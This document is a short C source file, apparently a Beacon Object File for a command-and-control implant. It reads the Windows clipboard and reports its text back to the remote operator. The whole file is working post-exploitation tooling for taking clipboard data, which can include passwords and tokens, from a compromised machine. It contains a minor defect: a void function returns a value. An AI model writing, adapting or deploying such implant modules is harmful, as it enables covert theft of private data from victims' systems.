/*
BOF to print clipboard entry.
*/

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT BOOL USER32$OpenClipboard(
  HWND hWndNewOwner
);

DECLSPEC_IMPORT HANDLE USER32$GetClipboardData(
  UINT uFormat
);

DECLSPEC_IMPORT LPVOID KERNEL32$GlobalLock(
  HGLOBAL hMem
);

DECLSPEC_IMPORT BOOL KERNEL32$GlobalUnlock(
  HGLOBAL hMem
);

DECLSPEC_IMPORT BOOL USER32$CloseClipboard();

void go(char* args, int argc) {
  // Open the clipboard
  if (USER32$OpenClipboard(NULL)) {
    // Get the handle to the clipboard data
    HANDLE hData = USER32$GetClipboardData(CF_TEXT);

    // Lock the memory associated with the handle
    char* pData = (char*)KERNEL32$GlobalLock(hData);

    // Check if the data is available
    if (pData) {
        // Print the clipboard text
        BeaconPrintf(CALLBACK_OUTPUT, "Clipboard text: %s\n", pData);

        // Release the lock
        KERNEL32$GlobalUnlock(hData);
    }

    // Close the clipboard
    USER32$CloseClipboard();
  }

  return 0;
}